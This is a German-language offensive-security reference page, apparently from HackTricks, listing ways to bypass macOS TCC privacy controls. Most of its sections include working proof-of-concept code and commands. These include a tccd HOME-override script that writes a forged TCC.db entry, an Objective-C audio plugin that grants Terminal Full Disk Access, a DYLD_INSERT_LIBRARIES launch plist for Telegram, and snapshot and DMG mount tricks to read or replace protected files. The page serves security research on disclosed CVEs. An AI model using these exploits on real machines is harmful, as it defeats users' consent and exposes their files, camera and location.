# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Nach Funktionalität

### Write Bypass

Dies ist kein Bypass, sondern einfach die Funktionsweise von TCC: **Es schützt nicht vor dem Schreiben**. Wenn Terminal **keinen Zugriff zum Lesen des Desktops eines Benutzers hat, kann es dennoch in ihn schreiben**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Das **erweiterte Attribut `com.apple.macl`** wird der neuen **Datei** hinzugefügt, um der **creators app** Zugriff zum Lesen zu gewähren.

### TCC ClickJacking

Es ist möglich, **ein Fenster über den TCC-Dialog zu legen**, damit der Benutzer ihn **akzeptiert**, ohne es zu bemerken. Einen PoC findest du unter [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ein Angreifer kann **Apps mit beliebigen Namen** (z. B. Finder, Google Chrome ...) in der **`Info.plist`** erstellen und sie dazu bringen, Zugriff auf einen durch TCC geschützten Ort anzufordern. Der Benutzer wird denken, dass die legitime Anwendung diesen Zugriff anfordert.\
Darüber hinaus ist es möglich, **die legitime App aus dem Dock zu entfernen und die gefälschte dort zu platzieren**, sodass die gefälschte App beim Anklicken (sie kann dasselbe Symbol verwenden) die legitime App aufrufen, TCC-Berechtigungen anfordern und eine Malware ausführen kann. Dadurch glaubt der Benutzer, dass die legitime App den Zugriff angefordert hat.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Weitere Informationen und einen PoC findest du unter:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Standardmäßig hatte ein Zugriff über **SSH "Full Disk Access"**. Um dies zu deaktivieren, muss SSH aufgelistet, aber deaktiviert sein (durch das Entfernen aus der Liste werden diese Berechtigungen nicht entfernt):

![TCC Request by arbitrary name - SSH Bypass: Standardmäßig hatte ein Zugriff über SSH "Full Disk Access". Um dies zu deaktivieren, muss SSH aufgelistet, aber deaktiviert sein (durch das Entfernen aus der Liste werden diese Berechtigungen nicht entfernt):](<../../../../../images/image (1077).png>)

Hier findest du Beispiele dafür, wie einige **Malwares diesen Schutz umgehen konnten**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Beachte, dass du jetzt **Full Disk Access** benötigst, um SSH aktivieren zu können.

### Handle extensions - CVE-2022-26767

Das Attribut **`com.apple.macl`** wird Dateien zugewiesen, um **einer bestimmten Anwendung Berechtigungen zum Lesen zu geben.** Dieses Attribut wird gesetzt, wenn eine Datei per **Drag\&Drop** auf eine App gezogen wird oder wenn ein Benutzer auf eine Datei **doppelklickt**, um sie mit der **Standardanwendung** zu öffnen.

Daher könnte ein Benutzer eine **bösartige App registrieren**, die alle Erweiterungen verarbeitet, und Launch Services aufrufen, um eine beliebige Datei zu **öffnen** (wodurch der bösartigen Datei Zugriff zum Lesen gewährt wird).

### iCloud

Mit dem Entitlement **`com.apple.private.icloud-account-access`** ist es möglich, mit dem **`com.apple.iCloudHelper`** XPC service zu kommunizieren, das **iCloud-Tokens bereitstellt**.

**iMovie** und **Garageband** verfügten über dieses sowie weitere Entitlements, die dies ermöglichten.

Weitere **Informationen** zum Exploit, mit dem sich über dieses Entitlement **iCloud-Tokens abrufen** lassen, findest du im Vortrag: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Eine App mit der Berechtigung **`kTCCServiceAppleEvents`** kann **andere Apps steuern**. Das bedeutet, dass sie möglicherweise die **den anderen Apps gewährten Berechtigungen missbrauchen** kann.

Weitere Informationen zu Apple Scripts findest du unter:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Wenn beispielsweise eine App **Automation-Berechtigungen für `iTerm`** besitzt, hat in diesem Beispiel **`Terminal`** Zugriff auf iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, das keinen FDA besitzt, kann iTerm aufrufen, das über FDA verfügt, und es verwenden, um Aktionen auszuführen:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Über den Finder

Oder wenn eine App über den Finder Zugriff hat, könnte sie ein Skript wie dieses ausführen:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Nach App-Verhalten

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Der **tccd daemon** im Userland verwendete die **`HOME`**-**env**-Variable, um auf die TCC-Benutzerdatenbank unter folgendem Pfad zuzugreifen: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Laut [diesem Stack Exchange-Post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) und weil der TCC daemon über **`launchd`** innerhalb der Domain des aktuellen Benutzers ausgeführt wird, ist es möglich, **alle an ihn übergebenen Umgebungsvariablen zu kontrollieren**.\
Dadurch könnte ein **Angreifer die `$HOME`-Umgebungsvariable** in **`launchctl`** auf ein **kontrolliertes** **Verzeichnis** setzen, den **TCC** daemon neu starten und anschließend die **TCC-Datenbank direkt verändern**, um sich selbst **jede verfügbare TCC-Berechtigung** zu gewähren, ohne den Endbenutzer jemals dazu aufzufordern.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes hatte Zugriff auf durch TCC geschützte Speicherorte, aber wenn eine Notiz erstellt wird, wird diese **an einem nicht geschützten Speicherort erstellt**. Daher konnte man Notes anweisen, eine geschützte Datei in eine Notiz zu kopieren (also an einen nicht geschützten Speicherort) und anschließend auf die Datei zugreifen:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Die Binary `/usr/libexec/lsd` mit der Library `libsecurity_translocate` hatte das Entitlement `com.apple.private.nullfs_allow`, das es ihr erlaubte, **nullfs**-Mounts zu erstellen. Außerdem besaß sie das Entitlement `com.apple.private.tcc.allow` mit **`kTCCServiceSystemPolicyAllFiles`**, um auf jede Datei zuzugreifen.

Es war möglich, das Quarantine-Attribut zu "Library" hinzuzufügen, den **`com.apple.security.translocation`**-XPC-Service aufzurufen, woraufhin Library nach **`$TMPDIR/AppTranslocation/d/d/Library`** gemappt wurde, wo auf alle Dokumente innerhalb von Library **zugegriffen** werden konnte.

### CVE-2024-44131 - FileProvider symlink race

Apps, die Dateioperationen an einen **privileged helper** (hier **`fileproviderd`** / **`Files.app`**) übergeben, kopieren oder verschieben Elemente **im Namen des Benutzers**. Dadurch läuft der copy mit den Privilegien des Helpers statt mit denen des Aufrufers.

Jamf Threat Labs zeigte, dass die vor der Operation durchgeführte Symlink-Validierung **geraced** werden kann: Statt den Symlink auf der **letzten** Pfadkomponente zu platzieren (die geprüft wird), tauscht der Angreifer ein **mittleres** Verzeichnis des Pfads **aus, nachdem der copy bereits begonnen hat**. Der privilegierte Helper folgt dann dem vom Angreifer kontrollierten Link und liest oder schreibt TCC-geschützte Speicherorte, **ohne jemals einen Prompt anzuzeigen**.

Verzeichnisse, die in ihrem Pfad **nicht** durch eine zufällige UUID geschützt sind (zum Beispiel `~/Library/Mobile Documents/com~apple~CloudDocs`), sind die einfachsten Ziele, da der Angreifer den vollständigen Pfad für die Race vorhersehen kann.

> [!TIP]
> Dies ist das generische Muster, nach dem gesucht werden sollte: **Jeder privilegierte Prozess, der einen Pfad mehr als einmal auflöst** (Check-then-use oder wenn `rename()`/`copyfile()` Quelle und Ziel getrennt auflösen) kann durch das Austauschen eines Verzeichnisses in der Mitte des Pfads geraced werden. Nur `O_NOFOLLOW_ANY`, `openat()` auf einem bereits geöffneten Directory-FD oder `realpath()` + erneute Validierung schließen das Zeitfenster tatsächlich.

Weitere Informationen im [**Writeup von Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).

### SQLITE_SQLLOG_DIR

`libsqlite3` kann mit `SQLITE_ENABLE_SQLLOG` gebaut werden. Dadurch wird ein durch Umgebungsvariablen gesteuerter Logging-Hook hinzugefügt ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):

- **`SQLITE_SQLLOG_DIR=path`** – für **jede geöffnete Datenbank** werden eine **Kopie der Datenbankdatei** und ein Log der SQL-Anweisungen in `path` geschrieben (das Verzeichnis muss bereits existieren).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bei jedem Öffnen/Anhängen einer DB wird eine **neue Kopie** erstellt, statt eine vorhandene wiederzuverwenden.
- **`SQLITE_SQLLOG_CONDITIONAL`** – eine Verbindung wird nur geloggt, wenn neben der Hauptdatenbank eine Datei `<database>-sqllog` existiert.

Wenn diese Variable in einen Prozess injiziert werden kann, der über **FDA** verfügt und SQLite-Datenbanken öffnet, kopiert er diese geschützten Datenbanken bereitwillig in ein von dir kontrolliertes Verzeichnis. Da der Zieldateiname aus vom Angreifer kontrollierten Daten abgeleitet wird, verwandelt ein am Ziel platzierter **Symlink** dieselbe Primitive in einen **arbitrary file write** mit den Privilegien des Zielprozesses.

### **SQLITE_AUTO_TRACE**

Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, beginnt die Library **`libsqlite3.dylib`**, alle SQL-Abfragen zu **loggen**. Viele Anwendungen verwendeten diese Library, daher war es möglich, alle ihre SQLite-Abfragen zu loggen.

Mehrere Apple-Anwendungen verwendeten diese Library, um auf TCC-geschützte Informationen zuzugreifen.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Suche nach env-var-gesteuerten Dateischreibvorgängen

Die beiden vorherigen Einträge sind Beispiele für dieselbe generische Technik, und es lohnt sich, nach weiteren zu suchen: **In TCC-privilegierte Apps geladene Frameworks stellen häufig Debug-/Logging-Umgebungsvariablen bereit, durch die der Prozess eine Datei an einem vom Aufrufer kontrollierten Pfad erstellt**.

Workflow zum Auffinden solcher Variablen:

1. Wähle ein Ziel mit FDA oder einer anderen interessanten TCC-Berechtigung (`Music`, `TV`, `Terminal`, MDM agents...) und liste die Frameworks auf, mit denen es verknüpft ist (`otool -L`, `vmmap`).
2. Durchsuche diese Frameworks nach `getenv`-Strings: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Setze Kandidatenvariablen über `launchctl setenv NAME /path/you/control`, starte die App und beobachte mit `fs_usage -w -f filesys <pid>` oder `sudo fs_usage | grep <path>`, was sie im Dateisystem tut.
4. Wenn der Prozess eine Datei in deinem Verzeichnis **erstellt oder umbenennt**, hast du ein Write Primitive: Verweise das Ziel auf einen Symlink (oder race ein Zwischenverzeichnis, wie oben bei CVE-2024-44131) und leite es dadurch auf `~/Library/Application Support/com.apple.TCC/TCC.db` um.

> [!TIP]
> Zwei Dinge schränken dies ein. Erstens werden **`DYLD_*`-Variablen für Binaries mit Hardened Runtime ignoriert**, sofern die App nicht das Entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) enthält ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — siehe auch [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Zweitens entfernt Apple einzelne Framework-Debugvariablen, sobald sie gemeldet werden. Daher ist eine Variable, die in einer macOS-Version funktioniert hat, in der nächsten häufig verschwunden. Wenn eine App nach dem Setzen einer Variablen die Ausführung stillschweigend verweigert, behandle diese Variable als bereits gefiltert.

Unter [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) findest du die entsprechende Methode mit Linker-Variablen.

### Apple Remote Desktop

Als root könntest du diesen Dienst aktivieren, und der **ARD agent hätte vollen Festplattenzugriff**, der anschließend von einem Benutzer missbraucht werden könnte, um eine neue **TCC user database** zu kopieren.

## Über **NFSHomeDirectory**

TCC verwendet eine Datenbank im HOME-Ordner des Benutzers, um den Zugriff auf benutzerspezifische Ressourcen unter **$HOME/Library/Application Support/com.apple.TCC/TCC.db** zu kontrollieren.\
Wenn es dem Benutzer daher gelingt, TCC mit einer auf einen **anderen Ordner** zeigenden $HOME-Umgebungsvariable neu zu starten, könnte der Benutzer eine neue TCC-Datenbank unter **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, einer beliebigen App eine beliebige TCC-Berechtigung zu erteilen.

> [!TIP]
> Beachte, dass Apple die in der Benutzerprofil-Einstellung gespeicherte **`NFSHomeDirectory`**-Eigenschaft für den **Wert von `$HOME`** verwendet. Wenn du daher eine Anwendung mit Berechtigungen zum Ändern dieses Werts (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromittierst, kannst du diese Option mit einem TCC bypass **weaponizen**.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Der **erste POC** verwendet [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) und [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), um den **HOME**-Ordner des Benutzers zu ändern.

1. Ermittle einen _csreq_-Blob für die Ziel-App.
2. Platziere eine gefälschte _TCC.db_-Datei mit dem erforderlichen Zugriff und dem _csreq_-Blob.
3. Exportiere den Directory-Services-Eintrag des Benutzers mit [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Ändere den Directory-Services-Eintrag, um das Home-Verzeichnis des Benutzers zu ändern.
5. Importiere den geänderten Directory-Services-Eintrag mit [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stoppe das _tccd_ des Benutzers und starte den Prozess neu.

Der zweite POC verwendete **`/usr/libexec/configd`**, das über `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` verfügte.\
Es war möglich, **`configd`** mit der Option **`-t`** auszuführen, wodurch ein Angreifer ein **benutzerdefiniertes Bundle zum Laden** angeben konnte. Der Exploit **ersetzt** daher die Methode zum Ändern des Home-Verzeichnisses über **`dsexport`** und **`dsimport`** durch eine **`configd` code injection**.

Weitere Informationen findest du im [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Über process injection

Es gibt verschiedene Techniken, um Code in einen Prozess zu injizieren und dessen TCC-Berechtigungen zu missbrauchen:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Darüber hinaus erfolgt der häufigste gefundene process injection zum Umgehen von TCC über **Plugins (load library)**.\
Plugins sind zusätzlicher Code, üblicherweise in Form von Bibliotheken oder plist-Dateien, der von der **Hauptanwendung geladen** und in deren Kontext ausgeführt wird. Wenn die Hauptanwendung daher Zugriff auf durch TCC eingeschränkte Dateien hatte (über erteilte Berechtigungen oder Entitlements), verfügt auch der **benutzerdefinierte Code darüber**.

### CVE-2020-27937 - Directory Utility

Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` verfügte über das Entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, lud Plugins mit der Erweiterung **`.daplug`** und hatte nicht die **Hardened Runtime** aktiviert.

Um diese CVE zu weaponizen, wird **`NFSHomeDirectory`** geändert (unter Ausnutzung des vorherigen Entitlements), damit die TCC-Datenbank des Benutzers übernommen und TCC umgangen werden kann.

Weitere Informationen findest du im [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Das Binary **`/usr/sbin/coreaudiod`** verfügte über die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Das erste **ermöglichte code injection**, während das zweite Zugriff auf die **Verwaltung von TCC** gewährte.

Dieses Binary konnte **third-party plug-ins** aus dem Ordner `/Library/Audio/Plug-Ins/HAL` laden. Daher war es möglich, ein Plugin zu **laden und die TCC-Berechtigungen zu missbrauchen**, wie in diesem PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Weitere Informationen finden Sie im [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Systemanwendungen, die über Core Media I/O einen Kamerastream öffnen (Anwendungen mit **`kTCCServiceCamera`**), laden **diese Plug-ins im Prozess**, die sich in `/Library/CoreMediaIO/Plug-Ins/DAL` befinden (nicht durch SIP eingeschränkt).

Bereits das Speichern einer Bibliothek mit dem üblichen **constructor** an diesem Ort reicht aus, um **Code zu injizieren**.

Mehrere Apple-Anwendungen waren dafür anfällig.

### Firefox

Die Firefox-Anwendung verfügte über die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Weitere Informationen dazu, wie dies einfach ausgenutzt werden kann, findest du im [**original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Die Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` verfügte über die Entitlements **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, wodurch Code in den Prozess injiziert und die TCC-Berechtigungen genutzt werden konnten.

### CVE-2023-26818 - Telegram

Telegram verfügte über die Entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, sodass diese Anwendung missbraucht werden konnte, um **Zugriff auf ihre Berechtigungen** zu erhalten, etwa für Aufnahmen mit der Kamera. Das [**Payload im writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) ist dort zu finden.

Um die Umgebungsvariable zum Laden einer Library zu verwenden, wurde eine **custom plist** erstellt, um diese Library zu injizieren, und **`launchctl`** wurde verwendet, um sie zu starten:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Durch open-Aufrufe

Es ist möglich, **`open`** auch innerhalb einer Sandbox aufzurufen.

### Terminal-Skripte

Es ist ziemlich üblich, Terminal **Full Disk Access (FDA)** zu gewähren, zumindest auf Computern, die von technisch versierten Personen verwendet werden. Außerdem ist es möglich, damit **`.terminal`**-Skripte aufzurufen.

**`.terminal`**-Skripte sind plist-Dateien wie diese, wobei sich der auszuführende Befehl im Schlüssel **`CommandString`** befindet:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Eine Anwendung könnte ein Terminal-Skript an einem Ort wie /tmp schreiben und es mit einem Befehl wie folgendem starten:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Durch Mounten

### CVE-2020-9771 - mount_apfs TCC bypass und Privilege Escalation

**Jeder Benutzer** (auch nicht privilegierte Benutzer) kann einen Time-Machine-Snapshot erstellen und mounten und auf **ALLE Dateien** dieses Snapshots zugreifen.\
Die **einzige erforderliche Berechtigung** besteht darin, dass die verwendete Anwendung (wie `Terminal`) über **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) verfügen muss, das von einem Administrator gewährt werden muss.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Eine detailliertere Erklärung ist im [**Originalbericht zu finden**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Selbst wenn die TCC-DB-Datei geschützt war, war es möglich, **das Verzeichnis mit einer neuen TCC.db-Datei zu mounten**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Siehe den **full exploit** im [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Wie im [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) erklärt, missbrauchte dieser CVE `diskarbitrationd`.

Die Funktion `DADiskMountWithArgumentsCommon` aus dem öffentlichen `DiskArbitration`-Framework führte die Security-Checks durch. Es ist jedoch möglich, diese zu umgehen, indem `diskarbitrationd` direkt aufgerufen wird und daher `../`-Elemente im Pfad sowie Symlinks verwendet werden.

Dadurch konnte ein Angreifer beliebige Mounts an jedem Ort durchführen, auch über der TCC-Datenbank, da `diskarbitrationd` über das Entitlement `com.apple.private.security.storage-exempt.heritable` verfügt.

### asr

Das Tool **`/usr/sbin/asr`** ermöglichte es, die gesamte Festplatte zu kopieren und sie an einem anderen Ort zu mounten, wodurch TCC-Schutzmechanismen umgangen wurden.

### Location Services

Es gibt eine dritte TCC-Datenbank unter **`/var/db/locationd/clients.plist`**, die angibt, welche Clients auf **Location Services** zugreifen dürfen.\
Der Ordner **`/var/db/locationd/` war nicht vor dem Mounten von DMGs geschützt**, sodass wir unsere eigene plist mounten konnten.

## Durch startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Durch grep

In mehreren Fällen speichern Dateien sensible Informationen wie E-Mail-Adressen, Telefonnummern, Nachrichten ... an nicht geschützten Orten (was bei Apple als Vulnerability zählt).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Das funktioniert nicht mehr, war aber [**in der Vergangenheit möglich**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Eine weitere Möglichkeit unter Verwendung von [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referenzen

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Möglichkeiten, die Privacy-Mechanismen von macOS zu umgehen**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass stiehlt Daten aus iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
